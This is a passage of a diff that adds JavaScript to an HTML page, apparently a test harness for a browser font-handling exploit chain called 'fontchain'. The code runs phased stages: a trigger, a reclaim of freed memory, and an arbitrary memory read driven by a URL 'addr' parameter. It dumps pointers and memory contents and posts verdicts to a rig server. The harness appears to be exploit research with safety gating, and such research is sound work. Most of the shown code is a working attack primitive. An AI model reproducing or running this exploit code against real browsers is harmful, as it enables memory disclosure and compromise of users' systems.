+    out.reason = "phase 2B did not yield the stale-face/reclaim pair";
+    setRow("rig-p3", out.verdict);
+    setTimeout(cb, 0);
+    return;
+  }
+  out.attempted = true;
+  probe("p3.run", function () {
+    var reader = makeReader(prim.ft, prim.fa);
+    window.__fontchain.reader = reader;
+    var d = reader.view;
+    /* self-address chain, as documented in arw-final.html */
+    var wp = d.getUint32(CFG.OFF_WRAPPER, true);
+    var wh = d.getUint32(CFG.OFF_WRAPPER + 4, true);
+    out.wrapperPtr = "0x" + hex8(wh) + hex8(wp);
+    var w = reader.rd(wp, wh, 32);
+    out.wrapperDump = hexdump(w, 32);
+    var fa2lo = (w[8] | w[9] << 8 | w[10] << 16 | w[11] << 24) >>> 0;
+    var fa2hi = (w[12] | w[13] << 8 | w[14] << 16 | w[15] << 24) >>> 0;
+    out.facePtr = "0x" + hex8(fa2hi) + hex8(fa2lo);
+    var bb = reader.rd(fa2lo, fa2hi, 0x40);
+    out.faceDump = hexdump(bb, 0x40);
+    var bklo = (bb[CFG.OFF_BACKING] | bb[CFG.OFF_BACKING + 1] << 8 |
+                bb[CFG.OFF_BACKING + 2] << 16 |
+                bb[CFG.OFF_BACKING + 3] << 24) >>> 0;
+    var bkhi = (bb[CFG.OFF_BACKING + 4] | bb[CFG.OFF_BACKING + 5] << 8 |
+                bb[CFG.OFF_BACKING + 6] << 16 |
+                bb[CFG.OFF_BACKING + 7] << 24) >>> 0;
+    out.selfAddress = "0x" + hex8(bkhi) + hex8(bklo);
+    out.verdict = "SELF-ADDR-OK";
+
+    /* optional explicit address dump: ?addr=0x71009AE144&len=16 */
+    var q = {}, m;
+    var qs = location.search.replace(/^\?/, "").split("&");
+    for (var i = 0; i < qs.length; i++) {
+      m = qs[i].split("=");
+      q[decodeURIComponent(m[0])] = decodeURIComponent(m[1] || "");
+    }
+    if (q.addr) {
+      var v = String(q.addr).replace(/^0x/, "");
+      if (/^[0-9a-fA-F]{1,16}$/.test(v)) {
+        v = ("0000000000000000" + v.toLowerCase()).slice(-16);
+        var alo = parseInt(v.slice(8, 16), 16) >>> 0;
+        var ahi = parseInt(v.slice(0, 8), 16) >>> 0;
+        var alen = Math.max(1, Math.min(parseInt(q.len, 10) || 16, 256));
+        var bytes = reader.rd(alo, ahi, alen);
+        out.addrDump = { addr: "0x" + hex8(ahi) + hex8(alo), len: alen,
+                         dump: hexdump(bytes, alen) };
+      } else {
+        out.addrDump = { error: "addr must be hex (got " + q.addr + ")" };
+      }
+    }
+  });
+  if (!out.verdict) {
+    out.verdict = "READ-THREW";
+    setRow("rig-p3", "read threw (see errors)");
+  } else {
+    setRow("rig-p3", out.verdict + " self=" + (out.selfAddress || "?") +
+           (out.addrDump ? " +addr dump" : ""));
+  }
+  disarmMarker("p3", out.verdict);
+  setTimeout(cb, 0);
+}
+
+/* ------------------------------------------------------------ verdict */
+function computeVerdict() {
+  if (R.p1.verdict === "TRIGGER-LIVE-SURVIVED") {
+    if (R.p2b && R.p2b.verdict === "PRIMITIVE") {
+      return R.p3 && R.p3.verdict === "SELF-ADDR-OK"
+          ? "ARB-READ-STUB-OK" : "RECLAIM-PRIMITIVE";
+    }
+    if (R.p2 && R.p2.verdict === "RECLAIM-HIT") { return "RECLAIM-HIT"; }
+    return "TRIGGER-LIVE-SURVIVED";
+  }
+  if (R.gate.priorCrash) { return "PRIOR-RUN-CRASHED"; }
+  return R.p1.verdict || "UNKNOWN";
+}
+
+/* ------------------------------------------------------------ driver */
+function gateRow() {
+  return "rig=" + (R.gate.rigPhase == null ? "?" : R.gate.rigPhase) +
+         " want=" + (R.gate.requestedPhase == null ? "?" : R.gate.requestedPhase) +
+         " effective=" + R.gate.effectivePhase;
+}
+function run() {
+  setRow("rig-url", location.href);
+  setRow("rig-ua", navigator.userAgent || "(no navigator.userAgent)");
+
+  var prior = checkPriorCrash();
+  if (prior) {
+    R.gate.priorCrash = true;
+    R.gate.priorCrashMarker = prior;
+    setRow("rig-verdict", "PRIOR RUN LEFT ARMED MARKER (crash oracle: " +
+           (prior.tag || "?") + " at " + (prior.ts || "?") + ")");
+  }
+
+  /* the gate: rig-side flag wins over the URL, never the reverse */
+  var want = 1;
+  try {
+    var mWant = location.search.match(/[?&]phase=(\d+)/);
+    if (mWant) { want = Math.max(1, Math.min(3, parseInt(mWant[1], 10))); }
+  } catch (e) {}
+  R.gate.requestedPhase = want;
+  getJson(RIG_BASE + "/rig/phase", function (j, err) {
+    if (j && typeof j.phase === "number") {
+      R.gate.rigPhase = j.phase;
+    } else {
+      R.gate.rigPhase = 1;                    /* unreachable gate == safe */
+      R.gate.gateError = err || "unparsable";
+    }
+    R.gate.effectivePhase = Math.min(R.gate.rigPhase, want);
+    setRow("rig-gate", gateRow());
+
+    /* phase env out immediately (crash insurance) */
+    postReport("env", function (ok, att) {
+      setRow("rig-post", ok ? "sent (env, " + att + " attempt(s))"
+                            : "env POST failed after " + att);
+    });
+
+    phase1(function () {
+      if (R.gate.effectivePhase < 2) {
+        return finish();
+      }
+      phase2(function () {
+        phase2b(function () {
+          if (R.gate.effectivePhase < 3) {
+            return finish();
+          }
+          phase3(function () { finish(); });
+        });
+      });
+    });
+  });
+
+  /* watchdog: whatever wedges, the page must still POST a partial result */
+  setTimeout(function () {
+    if (R.stage === "done") { return; }
+    fail("watchdog", "20s budget exceeded in stage " + R.stage);
+    finish();
+  }, 20000);
+
+  function finish() {
+    if (R.stage === "done") { return; }
+    R.stage = "done";
+    R.verdict = computeVerdict();
+    setRow("rig-verdict", R.verdict);
+    setState(R.verdict.indexOf("ARB-READ") === 0 ||
+             R.verdict === "RECLAIM-PRIMITIVE" ||
+             R.verdict === "RECLAIM-HIT" ? "HIT" : "DONE",
+             R.verdict.indexOf("ARB-READ") === 0 ||
+             R.verdict === "RECLAIM-PRIMITIVE" ||
+             R.verdict === "RECLAIM-HIT" ? "hit" : "done");
+    postReport("verdict", function (ok, att) {
+      setRow("rig-post", ok ? "sent (verdict, " + att + " attempt(s))"
+                            : "FAILED after " + att + " attempts");
+    });
+  }
+}
+
+/* expose the phase-1 trigger for wsagent-driven interactive repetition */
+window.__fontchain = window.__fontchain || {};
+window.__fontchain.runTrigger = runTriggerCandidate;
+window.__fontchain.cfg = CFG;
+
+try {
+  run();
+} catch (e) {
+  fail("driver", e);
+  R.stage = "CRASHED@" + (R.stage || "driver");
+  setState("HARNESS CRASHED", "failed");
+  setRow("rig-verdict", R.stage);
+  try { postReport("crash", function () {}); } catch (e2) {}
+}
+</script>
+</body>
+</html>
